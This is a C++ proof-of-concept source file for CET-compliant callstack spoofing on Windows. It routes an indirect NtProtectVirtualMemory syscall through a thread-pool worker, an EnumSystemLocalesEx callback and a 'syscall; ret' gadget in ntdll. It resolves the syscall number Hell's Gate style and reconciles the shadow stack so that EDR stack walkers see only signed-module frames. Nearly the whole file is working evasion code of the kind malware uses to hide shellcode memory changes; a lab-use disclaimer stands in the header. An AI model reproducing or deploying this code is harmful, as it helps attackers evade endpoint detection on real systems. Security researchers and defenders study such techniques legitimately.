/*
 * cet-spoofing.cpp - CET-Compliant Callstack Spoofing PoC (C++ port).
 *
 * Technique (ported from Tiziano Marra / MrTiz, 2026-07-12):
 *   thread pool execution  -> clean stack base
 *   enum callback trampoline (EnumSystemLocalesEx) -> a real signed-module frame
 *   indirect syscall (syscall;ret trampoline in ntdll) -> clean syscall return
 *   CET compliance: jmp-based context switch + RDSSPQ/INCSSPQ shadow-stack
 *   pointer reconciliation (see user_mode_continue.S).
 *
 * At the moment the syscall executes, every frame on the call stack belongs to a
 * signed Windows module: no synthetic frames, no fabricated unwind data.
 *
 * The same binary works with CET on or off: RDSSPQ returns 0 when CET is off and
 * the reconciliation loop is skipped.
 *
 * For authorised research / lab use only.
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>

#ifndef UNW_FLAG_NHANDLER
#define UNW_FLAG_NHANDLER 0
#endif

/* ---- the shared state passed between the three phases ---- */
struct EmbeddedContext {
    uint32_t ssn;               /* System Service Number (NtProtectVirtualMemory) */
    uint32_t pad0;
    uint64_t trampoline;        /* address of "syscall; ret" inside ntdll          */
    uint64_t args_len;          /* number of syscall arguments (1..11)             */
    uint64_t arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11;

    uint64_t invoke_count;      /* how many times the enum callback fired          */
    uint64_t backup_addr_arg5, backup_val_arg5;   /* phase-1 stack backups          */
    uint64_t backup_addr_arg6, backup_val_arg6;
    uint64_t backup_addr_arg7, backup_val_arg7;
    uint64_t init_once;
    uint64_t worker_ctx_ptr;
    uint64_t callback_ctx_ptr;
    uint64_t saved_aup;         /* original TEB.ArbitraryUserPointer               */
    uint64_t magic;             /* self-referencing cookie for validation          */
    uint64_t cb_sp;             /* phase-2 stack pointer (for cleanup)             */
    uint64_t cb_orig_5, cb_orig_6, cb_orig_7, cb_orig_8, cb_orig_9, cb_orig_10, cb_orig_11;
};

/* enum function used as the callback trampoline (set in main) */
static uint64_t g_enum_addr = 0;
static int g_stack_printed = 0;

/* written by user_mode_continue.S during shadow-stack reconciliation */
extern "C" uint64_t g_cet_ssp_before = 0;
extern "C" uint64_t g_cet_ssp_after = 0;

/* 16-byte aligned CONTEXT (movdqa in user_mode_continue needs it) */
struct alignas(16) AlignedContext { CONTEXT ctx; };

/* defined in user_mode_continue.S */
extern "C" void user_mode_continue(CONTEXT *context_record, uint64_t new_rsp);

/* ---- tiny symbol table so exported frames get real names ---- */
struct KnownSym { uint64_t funcBegin; wchar_t name[64]; };
static KnownSym g_syms[32];
static int g_symCount = 0;

static void AddSym(void *funcAddr, const wchar_t *name)
{
    if (!funcAddr || g_symCount >= 32) return;
    ULONG64 imageBase = 0;
    PRUNTIME_FUNCTION fe = RtlLookupFunctionEntry((ULONG64)funcAddr, &imageBase, NULL);
    uint64_t begin = fe ? imageBase + fe->BeginAddress : (uint64_t)funcAddr;
    g_syms[g_symCount].funcBegin = begin;
    wcsncpy(g_syms[g_symCount].name, name, 63);
    g_syms[g_symCount].name[63] = 0;
    g_symCount++;
}

/* ------------------------------------------------------------------ helpers */

static void *GetTeb()
{
    void *teb;
    __asm__ volatile("movq %%gs:0x30, %0" : "=r"(teb));
    return teb;
}
static void *GetPeb()
{
    void *peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

/* RDSSPQ rax -> shadow stack pointer (0 if CET is off) */
static uint64_t ReadSsp()
{
    uint64_t ssp;
    __asm__ volatile(
        "xor %%rax, %%rax\n\t"
        ".byte 0xF3,0x48,0x0F,0x1E,0xC8\n\t"   /* RDSSPQ rax */
        "mov %%rax, %0"
        : "=r"(ssp) :: "rax");
    return ssp;
}

/* scan a Zw* function body backwards for the "syscall; ret" (0F 05 C3) gadget */
static uint64_t GetTrampoline(void *func)
{
    ULONG64 imageBase = 0;
    PRUNTIME_FUNCTION fe = RtlLookupFunctionEntry((ULONG64)func, &imageBase, NULL);
    if (!fe) return 0;
    DWORD size = (DWORD)(fe->EndAddress - fe->BeginAddress);
    BYTE *p = (BYTE *)func;
    for (int i = (int)size - 3; i >= 0; i--)
        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
            return (uint64_t)(p + i);
    return 0;
}

/* resolve the SSN from the ntdll stub (Hell's Gate style) */
static uint32_t GetSsn(void *func)
{
    BYTE *p = (BYTE *)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(uint32_t *)(p + 4);
    for (int i = 0; i < 32; i++)
        if (p[i] == 0xB8) return *(uint32_t *)(p + i + 1);
    return 0x50;
}

static void ModuleNameOf(uint64_t addr, wchar_t *out, size_t cch)
{
    HMODULE h = NULL;
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCWSTR)addr, &h);
    out[0] = 0;
    if (!h) { wcsncpy(out, L"<unbacked>", cch); return; }
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(h, path, MAX_PATH);
    const wchar_t *base = wcsrchr(path, L'\\');
    wcsncpy(out, base ? base + 1 : path, cch);
}

/* walk a (possibly synthetic) CONTEXT the way an EDR stack walker would */
static void WalkStack(CONTEXT *start, int maxFrames)
{
    CONTEXT c = *start;
    for (int i = 0; i < maxFrames; i++) {
        if (!c.Rip) break;
        ULONG64 imageBase = 0;
        PRUNTIME_FUNCTION fe = RtlLookupFunctionEntry(c.Rip, &imageBase, NULL);
        uint64_t begin = fe ? imageBase + fe->BeginAddress : 0;

        const wchar_t *name = NULL;
        for (int k = 0; k < g_symCount; k++)
            if (g_syms[k].funcBegin == begin) { name = g_syms[k].name; break; }

        wchar_t mod[128];
        ModuleNameOf(c.Rip, mod, 128);
        if (name)
            printf("      #%d  %ls!%ls+0x%llx\n", i, mod, name,
                   (unsigned long long)(c.Rip - begin));
        else {
            uint64_t base = 0;
            RtlPcToFileHeader((PVOID)c.Rip, (PVOID *)&base);
            printf("      #%d  %ls+0x%llx\n", i, mod, (unsigned long long)(c.Rip - base));
        }

        if (!fe) { c.Rip = *(uint64_t *)c.Rsp; c.Rsp += 8; }
        else {
            PVOID handlerData = NULL; ULONG64 estFrame = 0;
            RtlVirtualUnwind(UNW_FLAG_NHANDLER, imageBase, c.Rip, fe, &c,
                             &handlerData, &estFrame, NULL);
        }
    }
}

/* ---------------------------------------------------- phase 2 & 3: callback */

extern "C" int __attribute__((noinline))
manual_stack_unwind_enum(LPWSTR loc, DWORD flags, LPARAM lparam)
{
    (void)loc; (void)flags; (void)lparam;
    void *teb = GetTeb();

    uint64_t ctx_ptr = *(volatile uint64_t *)((BYTE *)teb + 0x28);
    if (ctx_ptr == 0) return 0;
    uint64_t maybe_magic =
        *(volatile uint64_t *)(ctx_ptr + offsetof(EmbeddedContext, magic));
    if (maybe_magic != ctx_ptr) return 0;

    EmbeddedContext *args = (EmbeddedContext *)ctx_ptr;

    if (args->backup_addr_arg5) { *(uint64_t *)args->backup_addr_arg5 = args->backup_val_arg5; args->backup_addr_arg5 = 0; }
    if (args->backup_addr_arg6) { *(uint64_t *)args->backup_addr_arg6 = args->backup_val_arg6; args->backup_addr_arg6 = 0; }
    if (args->backup_addr_arg7) { *(uint64_t *)args->backup_addr_arg7 = args->backup_val_arg7; args->backup_addr_arg7 = 0; }

    args->invoke_count++;

    /* ---- phase 3: cleanup on a second invocation ---- */
    if (args->invoke_count > 1) {
        uint64_t *sp = (uint64_t *)args->cb_sp;
        if (sp) {
            if (args->args_len >= 5)  sp[5]  = args->cb_orig_5;
            if (args->args_len >= 6)  sp[6]  = args->cb_orig_6;
            if (args->args_len >= 7)  sp[7]  = args->cb_orig_7;
            if (args->args_len >= 8)  sp[8]  = args->cb_orig_8;
            if (args->args_len >= 9)  sp[9]  = args->cb_orig_9;
            if (args->args_len >= 10) sp[10] = args->cb_orig_10;
            if (args->args_len >= 11) sp[11] = args->cb_orig_11;
        }
        *(volatile uint64_t *)((BYTE *)teb + 0x28) = args->saved_aup;
        return 0;
    }

    /* ---- phase 2: set up and fire the indirect syscall ---- */
    static AlignedContext aligned;
    CONTEXT *cr = &aligned.ctx;
    args->callback_ctx_ptr = (uint64_t)&aligned;

    RtlCaptureContext(cr);

    ULONG64 imageBase = 0;
    PVOID handlerData = NULL;
    ULONG64 estFrame = 0;
    PRUNTIME_FUNCTION fe = RtlLookupFunctionEntry(cr->Rip, &imageBase, NULL);
    if (!fe) { cr->Rip = *(uint64_t *)cr->Rsp; cr->Rsp += 8; }
    else RtlVirtualUnwind(UNW_FLAG_NHANDLER, imageBase, cr->Rip, fe, cr,
                          &handlerData, &estFrame, NULL);

    uint64_t real_return = cr->Rip;

    cr->Rax = args->ssn;
    cr->Rip = args->trampoline;
    cr->Rcx = args->arg1;
    cr->R10 = args->arg1;
    cr->Rdx = args->arg2;
    cr->R8  = args->arg3;
    cr->R9  = args->arg4;

    uint64_t new_rsp = cr->Rsp - 8;
    cr->Rsp = new_rsp;
    uint64_t *sp = (uint64_t *)new_rsp;
    sp[0] = real_return;
    args->cb_sp = new_rsp;
    if (args->args_len >= 5)  { args->cb_orig_5  = sp[5];  sp[5]  = args->arg5;  }
    if (args->args_len >= 6)  { args->cb_orig_6  = sp[6];  sp[6]  = args->arg6;  }
    if (args->args_len >= 7)  { args->cb_orig_7  = sp[7];  sp[7]  = args->arg7;  }
    if (args->args_len >= 8)  { args->cb_orig_8  = sp[8];  sp[8]  = args->arg8;  }
    if (args->args_len >= 9)  { args->cb_orig_9  = sp[9];  sp[9]  = args->arg9;  }
    if (args->args_len >= 10) { args->cb_orig_10 = sp[10]; sp[10] = args->arg10; }
    if (args->args_len >= 11) { args->cb_orig_11 = sp[11]; sp[11] = args->arg11; }

    if (!g_stack_printed) {
        g_stack_printed = 1;
        printf("\n      --- call stack at the exact moment the syscall executes (EDR view) ---\n");
        WalkStack(cr, 8);
        printf("      --- end of stack ---\n");
    }

    *(volatile uint64_t *)((BYTE *)teb + 0x28) = args->saved_aup;
    user_mode_continue(cr, new_rsp);
}

/* ------------------------------------------- phase 1: thread pool worker */

extern "C" void CALLBACK thread_pool_worker_enum(PTP_CALLBACK_INSTANCE inst,
                                                 PVOID context, PTP_WORK work)
{
    (void)inst; (void)work;

    static AlignedContext aligned;
    CONTEXT *cr = &aligned.ctx;
    RtlCaptureContext(cr);

    ULONG64 imageBase = 0;
    PVOID handlerData = NULL;
    ULONG64 estFrame = 0;
    PRUNTIME_FUNCTION fe = RtlLookupFunctionEntry(cr->Rip, &imageBase, NULL);
    if (!fe) { cr->Rip = *(uint64_t *)cr->Rsp; cr->Rsp += 8; }
    else RtlVirtualUnwind(UNW_FLAG_NHANDLER, imageBase, cr->Rip, fe, cr,
                          &handlerData, &estFrame, NULL);

    uint64_t real_return = cr->Rip;
    uint64_t new_rsp = cr->Rsp - 8;
    cr->Rsp = new_rsp;
    *(uint64_t *)new_rsp = real_return;

    EmbeddedContext *args = (EmbeddedContext *)context;
    args->init_once = 0;
    args->worker_ctx_ptr = (uint64_t)&aligned;

    uint64_t *sp_orig = (uint64_t *)cr->Rsp;
    args->backup_addr_arg5 = (uint64_t)&sp_orig[4]; args->backup_val_arg5 = sp_orig[4];
    args->backup_addr_arg6 = (uint64_t)&sp_orig[5]; args->backup_val_arg6 = sp_orig[5];
    args->backup_addr_arg7 = (uint64_t)&sp_orig[6]; args->backup_val_arg7 = sp_orig[6];

    cr->Rip = g_enum_addr;
    cr->Rcx = (uint64_t)&manual_stack_unwind_enum;
    cr->Rdx = 0;
    cr->R8  = 0;
    cr->R9  = 0;
    uint64_t *sp_new = (uint64_t *)new_rsp;
    sp_new[5] = 0; sp_new[6] = 0; sp_new[7] = 0;

    void *teb = GetTeb();
    args->saved_aup = *(volatile uint64_t *)((BYTE *)teb + 0x28);
    *(volatile uint64_t *)((BYTE *)teb + 0x28) = (uint64_t)context;

    user_mode_continue(cr, new_rsp);
}

/* --------------------------------------------------------------- dispatcher */

static void ThreadPoolDispatch(EmbeddedContext *ctx)
{
    ctx->magic = (uint64_t)ctx;
    for (;;) {
        ctx->invoke_count = 0;
        PTP_WORK work = CreateThreadpoolWork(thread_pool_worker_enum, ctx, NULL);
        SubmitThreadpoolWork(work);
        WaitForThreadpoolWorkCallbacks(work, FALSE);
        CloseThreadpoolWork(work);
        if (ctx->invoke_count > 0) break;
    }
}

static int SpoofedProtectVirtualMemory(uint32_t ssn, uint64_t tramp,
                                       void *base, SIZE_T size, DWORD newProtect,
                                       DWORD *oldProtect)
{
    void *addr = base;
    SIZE_T sz = size;
    DWORD old = 0xFFFFFFFF;

    EmbeddedContext ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ssn = ssn;
    ctx.trampoline = tramp;
    ctx.args_len = 5;
    ctx.arg1 = (uint64_t)-1;                  /* NtCurrentProcess() */
    ctx.arg2 = (uint64_t)&addr;
    ctx.arg3 = (uint64_t)&sz;
    ctx.arg4 = newProtect;
    ctx.arg5 = (uint64_t)&old;

    ThreadPoolDispatch(&ctx);

    if (old == 0xFFFFFFFF) return 0;
    if (oldProtect) *oldProtect = old;
    return 1;
}

/* --------------------------------------------------------------------- main */

int main(void)
{
    printf("\n=====================================================================\n");
    printf(" CET-Compliant Callstack Spoofing PoC\n");
    printf(" thread pool -> enum callback -> indirect syscall + shadow-stack fixup\n");
    printf("=====================================================================\n");

    void *peb = GetPeb();
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE kbase = GetModuleHandleW(L"kernelbase.dll");
    HMODULE k32   = GetModuleHandleW(L"kernel32.dll");
    void *pPvm  = (void *)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    void *pEnum = (void *)GetProcAddress(kbase, "EnumSystemLocalesEx");
    g_enum_addr = (uint64_t)pEnum;

    AddSym(pPvm,  L"NtProtectVirtualMemory");
    AddSym(pEnum, L"EnumSystemLocalesEx");
    AddSym((void *)GetProcAddress(k32, "BaseThreadInitThunk"), L"BaseThreadInitThunk");
    AddSym((void *)GetProcAddress(ntdll, "RtlUserThreadStart"), L"RtlUserThreadStart");

    uint64_t tramp = GetTrampoline(pPvm);
    uint32_t ssn = GetSsn(pPvm);
    uint64_t ssp = ReadSsp();

    printf("\n// [1] environment\n");
    printf("      PEB                                : 0x%p\n", peb);
    printf("      ntdll.dll                          : 0x%p\n", (void *)ntdll);
    printf("      kernelbase.dll                     : 0x%p\n", (void *)kbase);
    printf("      EnumSystemLocalesEx (trampoline fn) : 0x%p\n", pEnum);
    printf("      NtProtectVirtualMemory             : 0x%p\n", pPvm);
    printf("      NtProtectVirtualMemory SSN         : 0x%x\n", ssn);
    printf("      'syscall; ret' gadget              : 0x%llx\n", (unsigned long long)tramp);

    printf("\n// [2] CET / shadow stack status\n");
    printf("      RDSSPQ -> SSP = 0x%llx  =>  CET %s\n",
           (unsigned long long)ssp,
           ssp ? "ON (INCSSPQ reconciliation active)" : "OFF (reconciliation is a no-op here)");

    void *page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!page) { printf("[!] VirtualAlloc failed (%lu)\n", GetLastError()); return 1; }
    memset(page, 0x90, 4096);

    printf("\n// [3] target page\n");
    printf("      0x%p  size 4096  protection PAGE_READWRITE\n", page);

    printf("\n// [4] indirect syscall NtProtectVirtualMemory through the spoofed chain\n");
    printf("      PAGE_READWRITE -> PAGE_EXECUTE_READ ...\n");
    DWORD oldProtect = 0;
    int ok = SpoofedProtectVirtualMemory(ssn, tramp, page, 4096, PAGE_EXECUTE_READ, &oldProtect);
    if (!ok) { printf("[!] spoofed NtProtectVirtualMemory did not complete\n"); return 1; }
    printf("      syscall returned; kernel reports old protection = 0x%lx\n", oldProtect);

    printf("\n// [4b] shadow-stack reconciliation (CET-compliant context switch)\n");
    if (g_cet_ssp_before) {
        uint64_t consumed = (g_cet_ssp_after - g_cet_ssp_before) / 8;
        printf("      SSP at entry      : 0x%llx\n", (unsigned long long)g_cet_ssp_before);
        printf("      SSP after realign : 0x%llx\n", (unsigned long long)g_cet_ssp_after);
        printf("      INCSSPQ consumed  : %llu stale entry(ies)\n", (unsigned long long)consumed);
        printf("      switch            : jmp (not ret) -> shadow stack not consulted, no #CP\n");
    } else {
        printf("      CET off: RDSSPQ returned 0, reconciliation skipped (same binary, no CET)\n");
    }

    printf("\n// [5] restore original protection\n");
    DWORD dummy = 0;
    SpoofedProtectVirtualMemory(ssn, tramp, page, 4096, oldProtect, &dummy);
    printf("      PAGE_EXECUTE_READ -> 0x%lx\n", oldProtect);

    printf("\n// [6] result\n");
    printf("      NtProtectVirtualMemory executed with a fully legitimate call stack:\n");
    printf("      every frame is ntdll/kernelbase/kernel32, no unbacked memory.\n");
    VirtualFree(page, 0, MEM_RELEASE);
    return 0;
}
